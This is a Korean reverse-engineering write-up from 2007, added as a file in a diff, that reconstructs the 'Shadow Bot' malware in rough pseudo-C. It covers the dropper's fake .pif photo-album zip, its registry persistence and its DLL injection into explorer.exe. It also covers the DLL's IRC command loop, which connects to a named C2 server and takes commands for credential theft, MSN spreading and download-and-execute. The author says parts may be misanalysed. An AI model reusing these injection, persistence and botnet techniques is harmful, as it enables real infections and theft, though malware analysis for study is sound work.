@@ -1,0 +1,818 @@
+Shadow Bot RE by 유리바다(seaofglass@korea.com) / 2007.04.04
+
+아는 후배부탁으로 저녁에 시작하여 새벽까지 졸면서 후딱 만들어 버린지라 
+
+충분히 잘못 분석된 부분이 있으리라고 생각합니다.
+
+그 이후로 귀차니즘 땜시 재확인조차 않하고 구석에 짱박아 두었다가 공개합니다.
+
+이 부분을 유념해 주시고 원리를 이해하는 학습용으로 사용해 주시기 바랍니다. 
+
+배포는 자유~
+
+//shadowbot.exe
+
+WinMain(hInstance, hPrevInstance, lpCmdLine, nShowCmd)
+{
+HMODULE hModule;
+LPSTR lpFilename;
+LPSTR lpBuffer;
+DWORD nSize = 260;
+String = "photo album2007.pif";
+aRdshost_dll = "rdshost.dll";
+asc_409B10 = "\\";
+Data = "rdshost.dll";
+
+HANDLE hObject;
+LPCVOID unk_406030;
+LPDWORD  lpNumberOfBytesWritten;
+
+GetWindowsDirectoryA(lpBuffer, 260);
+
+GetModuleFileNameA(NULL, lpFilename, 260);
+
+_strcat(lpBuffer, aPhotoAlbum_zip); // "C:\WINDOWS\photo album.zip"
+
+sub_401954(lpFileName, lpBuffer, String);
+
+sub_40136B();
+
+_strcpy(char *, aRdshost_dll);
+
+GetSystemDirectoryA(lpBuffer, 260);	// "C:\WINDOWS\System32"
+
+_strcat(lpBuffer, asc_409B10); // "C:\WINDOWS\System32\"
+_strcat(lpBuffer, Data);	// "C:\WINDOWS\System32\rdshost.dll"
+
+hObject = CreateFileA(lpBuffer, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, NORMAL, NULL);
+
+if(hObject == -1) sub_40129B(lpString);
+
+WriteFile(hObject, unk_406030, 14848, lpNumberOfBytesWritten, NULL);
+
+CloseHandle(hObject);
+}
+
+
+sub_401954(lpFileName, lpBuffer, lpString)
+{
+hFile = CreateFileA(lpFileName, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NORMAL, NULL);
+
+ if(hFile == -1)
+ {
+ hFile = 1; 
+ return;
+ }
+
+ if(hfile != 0)
+ {
+   hObject = CreateFileA(lpFileName, GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, NORMAL, NULL);
+   // "C:\WINDOWS\photo album.zip"
+
+   if(hObject = -1) CloseHandle(hObject);
+
+   if(hObject != 0)
+   {
+     _memset(Buffer, 0, 0x1E);
+     _memset(var_478, 0, 0x2E);
+     _memset(var_444, 0, 0x16); 
+     var_424 = 0;
+     Buffer = 0x4034B50;
+     var_41C = 0x0A;
+     var_472 = var_41C;
+     var_41A = 0;
+     var_470 = var_41A;
+     var_418 = 0;
+     var_46E = var_418;
+
+     sub_401D6C(var_416,var_414);
+
+     var_46C = var_416;
+     var_46A = var_414;
+
+     var_468= sub_401E49(hFile);
+
+     var_40E = GetFileSize(hFile, NULL);
+     var_464 = var_40E;
+
+     var_40A = GetFileSize(hFile, NULL);
+     var_460 = var_40A;
+
+     var_406 = lstrlenA(lpString); // lpString = "photo album2007.pif"
+     var_45C = var_406;
+     var_404 = 0;
+     var_45A = var_404;
+     var_44E = var_424;
+
+     WriteFile(hObject, Buffer, 0x1E, nNumberOfBytesWritten, NULL);
+
+     var_424 += 0x1E;
+
+     lstrlenA(lpString, nNumberOfBytesToWrite, NULL);
+
+     WriteFile(hObject, lpString, 19, NULL, NULL);
+
+     eax = lstrlenA(lpString);
+
+     var_424 += eax;
+
+     SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
+
+401BCD:
+
+     if(ReadFile(hFile, var_400, 1024, 0, NULL) != 0)
+     {
+	if(nNumberOfBytesToWrite != 0)
+	{
+		WriteFile(hObject, var_400, 1024, NumberOfBytesWritten, NULL);	
+		var_424 += nNumberOfBytesToWrite;
+		goto 401BCD;
+	}
+     }
+
+	var_434 = var_424;
+	var_478 = 0x2014B50;
+	var_474 = 0x14;
+	var_454 = 0;
+	var_452 = 0x20;
+
+	WriteFile(hObject, var_478, 46, nNumberOfBytesToWrite, NULL);
+
+	var_424 += 0x2E;
+
+	eax = lstrlenA(lpString, nNumberOfBytesWritten, NULL);
+
+	WriteFile(hObject, lpString, eax);
+
+	eax = lstrlenA(lpString);
+
+	var_424 += eax;
+	var_444 = 0x6054B50;
+	var_440 = 0;
+	var_43E = 0;
+	var_43C = 1;
+	var_43A = var_43C;
+	var_424 -= var_434;
+	var_430 = 0;
+
+	WriteFile(hObject, var_444, 16h, nNumberOfBytesToWrite, NULL);
+
+	CloseHandle(hObject);
+	CloseHandle(hFile);
+ }
+}
+
+sub_40136B()
+{
+SubKey[] = "Software\Microsoft\Windows\CurrentVersion\ShellServiceObject";
+ValueName = "rdshost";
+aClsid = "CLSID\\";
+aInprocServer32 = "\\InProcServer32";
+
+__alloca_probe(0x1020);
+
+Data = word_40A080;
+
+SubKey = word_40A084;
+
+_strcpy(Data, aRdshost_dll); // "rdshost.dll"
+
+GetSystemDirectoryA(SubKey, 2048); // "C:\WINDOWS\System32"
+
+_strcat(SubKey, asc_409A70); // "C:\WINDOWS\System32\"
+_strcat(SubKey, Data);	// "C:\WINDOWS\System32\rdshost.dll"
+
+CoInitialize(NULL);
+
+if(!CoCreateGuid(rguid)) return;
+
+_memset(Data, 0, 0x800);
+
+var101C = operator new(uinit);
+
+lpWideCharStr = var101C;
+
+StringFromGUID2(rguid, lpWideCharStr, 0x27);
+
+WideCharToMultiByte(CP_ACP, 0, lpWideCharStr, _wcslen(lpWideCharStr, Data, 0x800, NULL, NULL));
+//lpWideCharStr = "{1A543D85-2785-4161-9D2F-BCCE44C3F731}"
+
+var_1020 = lpWideCharStr;
+
+operator delete(void var_1020);
+
+RegCreateKeyExA(hKey, SubKey, 0, "", REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, hKey, NULL);
+// hKey = "HKEY_LOCAL_MACHINE
+// Subkey = "Software\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad"
+
+if(hKey == 0) return;
+
+RegSetValueExA(hKey, ValueName, 0, 1, Data, _strlen(Data));
+//ValueName = rdshost
+//ValueType = REG_SZ
+
+RegCloseKey(hKey);
+
+_strcpy(SubKey, aClsid);
+_strcat(SubKey, Data);	//  "CLSID\{1A543D85-2785-4161-9D2F-BCCE44C3F731}"
+_strcat(SubKey, aInprocServer32); // "CLSID\{1A543D85-2785-4161-9D2F-BCCE44C3F731}\InProcServer32"
+
+RegCreateKeyExA(hKey, SubKey, 0, byte_40A08C, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, hKey, NULL);
+//hKey = "HKEY_CLASSES_ROOT"
+//SubKey = "CLSID\{1A543D85-2785-4161-9D2F-BCCE44C3F731}\InProcServer32"
+
+if(hKey == 0) return;
+
+RegSetValueExA(hKey, NULL, 0, 1, Data, _strlen(Data));
+//ValueType = REG_SZ
+
+RegCloseKey(hKey);
+}
+
+sub_40129B(lpString)
+{
+hObject = 0;
+var_8 = 0;
+dwProcessId = 0;
+
+var_4 = 0;
+
+sub_4011CA();
+
+hObject = CreateToolhelp32Snapshot(2, 0);
+
+if(hObject == -1) return;
+
+dwProcessId = 0x128;
+
+eax = Process32First(hObject, dwProcessId);
+
+if(eax == 0) CloseHandle(hObject);
+
+Process:
+
+	if(var_4 == var_118)
+	{
+		sub_401177(dwProcessId, lpString);
+	}
+
+	if(var_4 == var_128)
+	{
+		if(Process32Next(hObject, dwProcessId)) goto Process;
+	}
+
+ClsoeHandle(hObject);
+}
+
+sub_401D6C(var_416,var_414)
+{
+GetSystemTime(SystemTime);
+
+if((SystemTime.wYear && 0x0FFFF) < 0x7CF)
+	SystemTime.wYear = 0x7D4;
+
+if((SystemTime.wYear && 0x0FFFF) <= 0x7DA)
+	if((SystemTime.wMonth && 0x0FFFF) < 1)
+	{
+	SystemTime.wMonth = 1;
+	}
+	else
+	{
+	  if((SystemTime.wMonth && 0x0FFFF) <= 0x0C))
+	    if((SystemTime.wDay && 0x0FFFF) < 1)
+	    {
+ 		SystemTime.wDay = 0x0A;
+		arg_4 = ((((SystemTime.wYear && 0x0FFFF) - 0x7BC) << 9) || ((SystemTime.wMonth && 0x0FFFF) << 5)) || (SystemTime.wDay && 0x0FFFF);
+		arg_0 = (((SystemTime.wHour && 0x0FFFF) << 0x0B) || ((SystemTime.wMinute && 0x0FFFF) << 5)) || (SystemTime.wSecond && 0FFFFh) sar 1;
+	    }
+	    else if((SystemTime.wDay) && 0x0FFFF) <= 0x1F)
+	    {
+		arg_4 = ((((SystemTime.wYear && 0x0FFFF) - 0x7BC) << 9) || ((SystemTime.wMonth && 0FFFFh) << 5)) || (SystemTime.wDay && 0x0FFFF);
+		arg_0 = (((SystemTime.wHour && 0x0FFFF) << 0x0B) || ((SystemTime.wMinute && 0x0FFFF) << 5)) || (SystemTime.wSecond && 0x0FFFF) sar 1;
+	    }
+	 }
+}
+
+sub_401E49(hFile)
+{
+SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
+var_408 = 0;
+
+loc_401E6C:
+
+NumberOfBytesRead = 0;
+
+if(ReadFile(hFile, Buffer, 1024, NumberOfBytesRead, NULL))
+{
+	if(NumberOfBytesRead != 0)
+	{
+	var_408 = sub_4016E0(var_408, Buffer, NumberofBytesRead);
+	goto loc_401E6C;
+	}
+}
+
+SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
+
+return var_408;	
+}
+
+sub_4016E0(var_408, Buffer, NumberofBytesRead)
+{
+for(var_408 = 0;var_408 <= 256;var_408++)
+{
+ var_4 = var_408;
+
+ for(var_40C = 8;var_40C >= 0; var_40C--)
+ {
+  if(var_4 && 1)
+  {	
+   var_4 /= 2;
+  }
+  else
+  {
+   var_4 = (var_4/=2) ^ 0xEDB88320;
+  }
+ }
+}
+
+eax = var_408
+[ebp+eax*4+var_404] = var_4;
+
+if(arg_4 != 0)
+{
+ arg_0 ^= -1;
+}
+else return;
+
+
+loc_401789:
+
+if(arg_8 < 8)
+{
+ if(arg_8 == 0)
+ arg_0 ^= -1;
+ return;
+}
+
+for(i=0;i<7;i++)
+{
+edx = (arg_0 ^ &arg_4) && 0xFF;
+
+[ebp+edx*4+var_404] ^= (arg_0 >> 8);
+
+arg_0 = [ebp+edx*4+var_404];
+
+&arg_4++;
+}
+
+arg_8 -= 8;
+
+goto loc_401789;
+
+if(arg_8 == 0)
+{
+eax = arg_0 ^ -1;
+return;
+}
+
+loc_40190F:
+
+eax = (arg_0 ^ &arg_4) && 0xFF;
+
+arg_0 = [ebp+eax*4+var_404] ^(arg_0 >> 8);
+
+arg_4++;
+
+arg_8--;
+
+if(arg_8 != 0)
+{
+goto loc_40190F;
+}
+
+}
+
+
+
+sub_4011CA()
+{
+aExplorer_exe = "explorer.exe";
+hObject = 0;
+pe = 0;
+
+hObject = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+if(hObject == -1) return;
+
+pe = 0x128;
+
+if(!Process32First(hObject, pe)) CloseHandle(hObject);
+
+loc_401234:
+
+_strlwr(var_104);
+
+if(!_strstr(var_104, aExplorer_exe))
+{
+	if(!Process32Next(hObject, pe)) goto loc_401234;
+}
+
+CloseHandle(hObject);
+}
+
+
+sub_401177()
+{
+aS = "%S";
+
+eax = lstrlenA(lpString);
+eax = ((eax*2+2) + 3 && 0x0FC);
+
+__alloca_probe();
+
+var_8 = esp;
+lpBuffer, var_8;
+
+wsprintf(lpBuffer, aS, lpString);
+
+sub_401000(dwProcessId, lpBuffer);
+}
+
+sub_401000(dwProcessId, lpBuffer)
+{
+ModuleName = "Kernel32";
+ProcName = "LoadLibraryW";
+
+var_24 = 0;
+hProcess = 0;
+hHandle = 0;
+lpParameter = 0;
+var_4 = 0;
+
+hProcess = OpenProcess(0x42A, 0, dwProcessId); 
+
+if(hProcess == 0)
+{
+goto loc_401117;
+}
+
+var_34 = lstrlenW(lpBuffer) + 1;
+
+nSize = (var_34 <<= 1);
+
+lpParameter = VirtualAllocEx(hProcess, 0, nSize, MEM_COMMIT, PAGE_READWRITE);
+
+if(lpParameter == 0)
+{
+goto loc_401117;
+}
+
+if(!WriteProcessMemory(hProcess, lpParameter, lpBuffer, nSize, NULL))
+goto loc_401117;
+
+hModule = GetModuleHandleA(ModuleName, ProcName);
+
+lpStartAddress = GetProcAddress(hModule);
+
+if(lpStartAddress == 0) goto loc_401117;
+
+hHandle = CreateRemoteThread(hProcess, 0, 0, lpStartAddress, lpParameter, 0, 0);
+
+if(hHandle == 0) goto loc_401117;
+
+WaitForSingleObject(hHandle, -1);
+
+var_24 = 1;
+
+var_4 = -1;
+
+sub_401125();
+
+loc_401117:
+
+var_4 = -1;
+sub_401125();
+}
+
+sub_401125()
+{
+ if(var_28 != 0)
+ {
+ VirtualFreeEx(hProcess, lpAddress, 0, MEM_RELEASE);
+ }
+ if(var_1C != 0)
+ {
+  if(var_20 != 0) return;
+  else CloseHandle(var_20);
+ }
+ else
+ {
+  CloseHandle(var_1C);
+ }
+}
+
+
+
+//rdshost.dll
+_stdcall DllMain(HINSTNCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+{
+if(fdwReason != 1)
+{
+DisableThreadLibraryCalls(hLibModule);
+
+var_4 = CreateThread(0,0, offset sub_100029DE, 0, 0, ThreadId);
+}
+else if(fdwReason != 0)
+{
+ eax = 1;
+if(fdwReason == 0)
+	eax = 1;
+}
+return 0xC;
+}
+
+__stdcall sub_100029DE(LPVOID)
+{
+Name = "uuuifyouseethatucanonlysuckmydick:p";
+aDarkjester_xpl = "darkjester.xplosionirc.net";
+aNickSIhS = "NICK [%s][%iH]%s";
+aLolLolLolShado = "lol lol lol :shadowbot";
+aUserS = "USER %s";
+aJoinS = "JOIN %s\n";
+aTest = "#test";
+a_S1 = "%S";
+a_Ping = "PING :";
+aPing_0 = "PING :";
+aPing_1 = "PING :";
+aPing_S = "PING :";
+aKick = "KICK";
+aPrivmsg = "PRIVMSG";
+aNotice = "NOTICE";
+
+var_1A8 = CreateMutexA(0, 0, Name);
+
+if(GetLastError() != 0xB7)
+{
+ExitProcess(0);
+}
+
+WSAStartup(1, WSAData);
+
+sub_100025C0();
+
+name.sa_data = htons(hostshort, 2, inet_addr(cp));
+
+s = socket(2, 1, 6);
+
+while()
+{
+if(!connect(s, name, 0x10))
+{
+GetLocalInfoA(0x800, 7, LCData, 0xA);
+GetTickCount();
+
+eax = sub_1000262F(8);
+
+sprintf(buf, zNickSIhS, LCData, var_198, eax);
+send(s, buf, strlen(buf, 0));
+sprintf(buf, aUserS, aLolLolLolShado);
+send(s, buf, strlen(buf, 0));
+Sleep(0x1F4);
+sprintf(buf, aJoinS, aTest);
+send(s, buf, strlen(buf, 0));
+
+memset(buf, 0 0x200);
+
+if(!recv(s, buf, 0x1FF, 0))
+{
+WSACleanup();
+closesocket(s);
+}
+else
+{
+printf(aS_1, buf);
+ if(strstr(buf, aPing))
+ {
+  strstr(buf, aPing_0);
+  sprintf(var_4A8, aPongS, var_4 + strlen(aPing_1));
+  send(s, var_4A8, strlen(var_4A8, 0);
+ }
+ else
+ {
+  strstr(buf, a404);
+ }
+
+ if(!strstr(buf, a404))
+ {
+ sprintf(var_4A8, aJoinS_0, aTest);
+ send(s, var_4A8, strlen(var_4A8, 0));
+ }
+
+ if(!strstr(buf, aKick))
+ {
+  sprintf(var_4A8, aJoinS_1, aTest);
+  send(s, var_4A8, strlen(var_4A8, 0));
+ }
+
+ if(strstr(buf, aPrivmsg))
+ {
+  	sub_100027D5(buf);
+ }
+ else if(!strstr(buf, aNotice))
+ {
+   sub_100027D5(buf);
+ }
+}
+
+}
+else
+{
+Sleep(dwMilliseconds);
+continue;
+}
+}
+}
+
+sub_1000262F()
+{
+arg_0 = 1;
+
+var_4 = malloc(arg_0);
+memset(var_4, 0, arg_0 + 1);
+srand(time(0));
+var_C = 0;
+
+while(1)
+{
+ if(var_C => arg_0)
+ {
+ var_8 = (rand() / 0x1A) + 0x61;
+ strcat(var_4, var_8);
+ }
+ else
+ {
+  return;
+ }
+ var_C++;
+}
+
+}
+
+int __stdcall sub_100025C0(char *)
+{
+var_44 = 0;
+
+if(arg_0 != 0)
+{
+strcpy(name, arg_0);
+}
+else
+{
+strcpy(name, unk_10005664);
+}
+
+var_44 = gethostbyname(name);
+
+if(var_44 != 0)
+{
+inet_ntoa();
+return 4;
+}
+else
+{
+Sleep(dwMilliseconds);
+}
+}
+
+int __stdcall sub_100027D5(char *)
+{
+asc_100053D4 = "\r\n";
+aImstart = "imstart";
+aTest = "#test";
+aPrivmsgSRootSp = "PRIVMSG %s :Root -> [:] Spread Started";
+aPstore = "pstore";
+aPrivmsgSRootEx = "PRIVMSG %s :Root -> [:] Executing pstore";
+aMsnfuck = "msnfuck";
+aDlexec = "dlexec";
+a_exe = ".exe";
+aPrivmsgSExecut = "PRIVMSG %s :Executed [%s]";
+aPrivmsgSFailed = "PRIVMSG %s :Failed [%s]";
+
+var_28 = strtok(arg_0, asc_100053D4);
+var_2C = 1;
+
+loc_10002805:
+
+if(var_2C <= 0A)
+{
+ if(strstr(var_1C, aImstart))
+ {
+  sprintf(byte_10005560, aPrivmsgSRootSp, aTest);
+  send(s, byte_10005560, strlen(byte_10005560, 0));
+ }
+}
+else
+{
+strtok(0, asc_100053D4);
+}
+
+if(!strstr(var_1C, aPstore))
+{
+sprintf(byte_10005560, aPrivmsgSRootEx, aTest);
+send(s, byte_10005560, strlen(byte_10005560, 0));
+CreateThread(0, 0, StartAddress, 0, 0, 0);
+}
+
+if(!strstr(var_1C, aMsnfuck))
+{
+sub_10001283(lpMultiByteStr);
+}
+else
+{
+ if(!strstr(var_1C, aDlexec))
+ { 
+  return;
+ }
+
+lpszUrl = lpMultiByteStr;
+
+strcpy(CommandLine, sub_1000262F(6));
+strcat(CommandLine, a_exe);
+
+if(sub_100026BB(lpszUrl, CommandLine))
+{
+sprintf(byte_10005560, aPrivmsgSExecut, aTest);
+send(s, byte_10005560, strlen(byte_10005560, 0));
+}
+else
+{
+sprintf(byte_10005560, aPrivmsgSFailed, aTest);
+}
+
+send(s, byte_10005560, strlen(byte_10005560, 0));
+return;
+}
+}
+}
+
+int __stdcall sub_10001283(LPCSTR lpMultiByteStr)
+{
+ppv = 0;
+CoInitialize(0);
+var_8 = CoCreateInstance(rclsid, 0, 0x17, riid, ppv);
+
+if(var_8 < 0)
+{
+return;
+}
+else
+{
+var_10 = std::ios_vase::register_callback(void (*)(std::ios_base::event, std::ios_base &,int),int);
+sub_10001700(0);
+}
+}
+
+int __stdcall sub_100026BB(LPCSTR lpszUrl,LPSTR lpCommandLine)
+{
+szAgent = "wget";
+aWb = "wb";
+
+memset(StartupInfo, 0, 0x44);
+memset(ProcessInformation, 0, 0x10);
+
+StartupInfo.cb = 0x44;
+StartupInfo.dwFlags = 1;
+StartupInfo.wShowWindow = 0;
+
+hInternet = InternetOpenA(szAgent, 0, 0, 0, 0);
+
+if(hInternet != 0)
+{
+hFile = InternetOpenUrlA(hInternet, lpszUrl, 0, 0, 0, 0);
+
+if(hFile)
+{
+var_64 = fopen(lpCommandLine, aWb);
+
+ if(var_64)
+ {
+
+  loc_1000275C:
+
+  if(InternetReadFile(hFile, Buffer, 0x62, dwNumberOfBytesRead))
+  {
+   if(dwNumberOfBytesRead)
+   {
+    fwrite(Buffer, 1, dwNumberOfBytesRead, var_64);
+    goto loc_1000275C;
+   }
+  }
+  else
+  {
+   fclose(var_64);
+
+   CreateProcessA(0, lpCommandLine, 0, 0, 1, 0x20, 0, 0, StartupInfo, ProcessInfomation);
+  } 
+}
+
+}
